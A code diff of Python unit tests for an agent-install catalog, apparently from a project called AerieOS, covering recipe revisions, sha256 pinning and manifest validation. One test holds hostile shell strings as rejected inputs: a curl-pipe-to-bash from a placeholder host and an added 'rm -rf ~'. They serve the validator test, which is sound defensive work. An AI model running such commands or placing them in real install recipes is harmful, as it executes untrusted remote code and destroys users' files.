@@ -179,7 +179,7 @@ class Controller(unittest.TestCase):
     def test_a_newer_recipe_in_the_catalog_is_the_one_sent(self):
         # The point of it: an installer that changed upstream is answered
         # by the catalog, with no release of AerieOS.
-        theirs = agents.get("codex").install | {"rev": 2, "bin": ".codex/bin/codex", "also": [".local/bin/codex"]}
+        theirs = agents.get("codex").install | {"rev": 3, "bin": ".codex/bin/codex", "also": [".local/bin/codex"]}
         asked = self.catalog(theirs)
         ns = self.use(node())
         agentcode.update("user:admin", "n1", "codex")
@@ -255,13 +255,13 @@ class Controller(unittest.TestCase):
         self.assertEqual(agentcode.recipe("codex"), (agents.get("codex").install, "release"))
 
     def test_a_pack_that_cannot_be_read_leaves_the_table_s(self):
-        asked = self.catalog(None, error="its archive's sha256 differs, so it is refused", says=2)
+        asked = self.catalog(None, error="its archive's sha256 differs, so it is refused", says=3)
         self.assertEqual(agentcode.recipe("codex"), (agents.get("codex").install, "release"))
         self.assertEqual(agentcode.recipe("codex"), (agents.get("codex").install, "release"))
         self.assertEqual(len(asked), 1)          # asked again only after RECIPE_MISS_S
 
     def test_the_library_s_read_fetches_a_newer_recipe_ahead_of_the_press(self):
-        theirs = agents.get("codex").install | {"rev": 2, "bin": ".codex/bin/codex"}
+        theirs = agents.get("codex").install | {"rev": 3, "bin": ".codex/bin/codex"}
         asked = self.catalog(theirs)
         agentcode.warm()
         for _ in range(200):
@@ -284,13 +284,42 @@ class Controller(unittest.TestCase):
     def test_an_official_pack_s_manifest_carries_it_and_no_other_pack_s_does(self):
         import toolpacks  # noqa: PLC0415
         a = agents.get("open")
-        m = {"name": "open", "tier": "official", "platforms": ["linux/*"], "terms": [],
+        m = {"name": "open", "tier": "official", "format": 5, "platforms": ["linux/*"], "terms": [],
              "agent": {k: getattr(a, k) for k in toolpacks.AGENT_FIELDS} | {"install": a.install}}
         clean, errors = toolpacks.validate(m, official=True)
         self.assertEqual(errors, [])
         self.assertEqual(clean["agent"]["install"], a.install)
-        m["agent"]["install"] = a.install | {"script": "curl -fsSL https://x.example/i | bash; rm -rf ~"}
+        # A step that would be a line of shell is refused, as a script that
+        # would run more than its one installer always was.
+        m["agent"]["install"] = a.install | {"steps": [["bash", "-c", "curl -fsSL https://x.example/i | bash"]]}
+        self.assertIn("agent.install.steps", " ".join(toolpacks.validate(m, official=True)[1]))
+        m["agent"]["install"] = OLD["opencode-update"] | {"script": "curl -fsSL https://x.example/i | bash; rm -rf ~"}
         self.assertIn("agent.install.script", " ".join(toolpacks.validate(m, official=True)[1]))
+
+    def test_every_shipped_agent_s_recipe_holds_what_it_fetches(self):
+        # The five as the table ships them (agent-recipes.json): no recipe
+        # hands a vendor's installer to a shell as it arrives, each
+        # download is held to a sha256, and each reads pinned or
+        # installer with its own sentence. A recipe that places its
+        # program names it for both platforms a node may be.
+        import packformat  # noqa: PLC0415
+        words = {}
+        for a in agents.TABLE:
+            r = a.install
+            self.assertEqual(agents.install_checked(r), (r, ""), a.id)
+            self.assertNotIn("script", r, a.id)
+            self.assertTrue(all(packformat.SHA256.fullmatch(f["sha256"]) for f in r["fetch"]), a.id)
+            words[a.id] = packformat.agent_held(r)["word"]
+            if words[a.id] == "installer":
+                self.assertEqual(packformat.agent_held(r)["why"], r["online"], a.id)
+                self.assertIn(r["steps"][0][0], ("sh", "bash"), a.id)
+            else:
+                self.assertEqual(sorted(f["platform"] for f in r["fetch"]), ["linux/amd64", "linux/arm64"], a.id)
+                self.assertEqual((agents.install_pins(r), r["pin"]), (r["fetch"][0]["version"], None), a.id)
+        self.assertEqual(words, {"claude": "installer", "codex": "installer", "copilot": "pinned", "grok": "pinned", "open": "installer"})
+        # The file the table reads is the one copy: what it holds is the table's.
+        with open(os.path.join(HERE, "..", "agent-recipes.json"), encoding="utf-8") as f:
+            self.assertEqual(json.load(f)["recipes"], {a.id: a.install for a in agents.TABLE})
 
     def test_an_update_holds_that_agents_starts_as_claude_codes_does(self):
         ns = self.use(node())
@@ -644,7 +673,8 @@ class NodeAgent(unittest.TestCase):
             # which is where the node's row says a removal finds it.
             sent, why = self.mod.recipe_checked(a.install)
             self.assertEqual(why, "", a.id)
-            self.assertEqual((sent["bin"], sent["also"]), (how["bin"], tuple(how.get("also", ()))), a.id)
+            self.assertEqual(sent["bin"], how["bin"], a.id)
+            self.assertLessEqual(set(how.get("also", ())), set(sent["also"]), f"{a.id}: the recipe clears every place the row would")
             self.assertEqual({k: sent[k] for k in ("script", "steps", "online", "keyring", "pin", "env", "fresh")},
                              {"script": a.install.get("script", ""), "steps": a.install.get("steps", []), "online": a.install.get("online", ""),
                               "keyring": a.install.get("keyring", {}), "pin": tuple(a.install["pin"]) if a.install["pin"] else None,
